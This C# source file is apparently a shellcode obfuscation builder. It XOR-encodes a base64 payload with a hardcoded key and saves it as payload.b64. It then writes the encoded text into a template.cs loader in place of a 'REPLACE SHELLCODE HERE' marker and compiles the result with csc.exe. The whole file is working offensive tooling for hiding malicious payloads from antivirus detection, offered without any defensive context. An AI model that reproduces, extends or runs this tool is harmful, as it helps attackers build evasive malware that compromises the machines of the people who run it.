using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace ObfuscatorXOR
{
    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        private static Random random = new Random();
        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        static byte[] Encrypt(string plainText, byte[] Key, byte[] IV)
        {
            byte[] encrypted;
            // Create a new AesManaged.    
            using (AesManaged aes = new AesManaged())
            {
                // Create encryptor    
                ICryptoTransform encryptor = aes.CreateEncryptor(Key, IV);
                // Create MemoryStream    
                using (MemoryStream ms = new MemoryStream())
                {
                    // Create crypto stream using the CryptoStream class. This class is the key to encryption    
                    // and encrypts and decrypts data from any given stream. In this case, we will pass a memory stream    
                    // to encrypt    
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        // Create StreamWriter and write data to a stream    
                        using (StreamWriter sw = new StreamWriter(cs))
                            sw.Write(plainText);
                        encrypted = ms.ToArray();
                    }
                }
            }
            // Return encrypted data    
            return encrypted;
        }

        static void Main(string[] args)
        {

            // get file path

            string filePath = "";
            if (args.Count() > 0) // if arg exists
            {
                filePath = args[0];

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }

            }

            //check if its base64 encoded
            string base64String = File.ReadAllText(filePath);

            if (!IsBase64String(base64String))
            {
                Console.WriteLine("[!] Make sure that it is a base64 string");
            }else
            {
                var xorKey = "SuperSecureKey".ToString();

                byte[] xorEncString = xorEncDec(Convert.FromBase64String(base64String), xorKey); //encrypt

                string xorEncStringB64 = Convert.ToBase64String(xorEncString);

                Console.WriteLine($"XOR encrypted text: {xorEncStringB64}");

                //decrypt it back

                //var decrypted = Convert.ToBase64String(xorEncDec((Convert.FromBase64String(xorEncStringB64)), xorKey));

                //Console.WriteLine($"XOR decrypted text: {decrypted}");

                // Write the file 
                var fullPath = Path.Combine(Directory.GetCurrentDirectory(), "payload.b64");

                using (StreamWriter writer = new StreamWriter(fullPath))
                {
                    writer.WriteLine(xorEncStringB64);
                }

                // Open template file
                var templateFile = Path.Combine(Directory.GetCurrentDirectory(), "template.cs");
                var outputFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");
                // read all content
                string templateFileContent = File.ReadAllText(templateFile);
                // replace "string xoredB64" line
                templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorEncStringB64);
                // write all back into the file
                File.WriteAllText(outputFile, templateFileContent);

                //compile the code
                string strCmd = "/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe "+ outputFile;
                System.Diagnostics.Process.Start("CMD.exe", strCmd);
            }
        }


    }

}
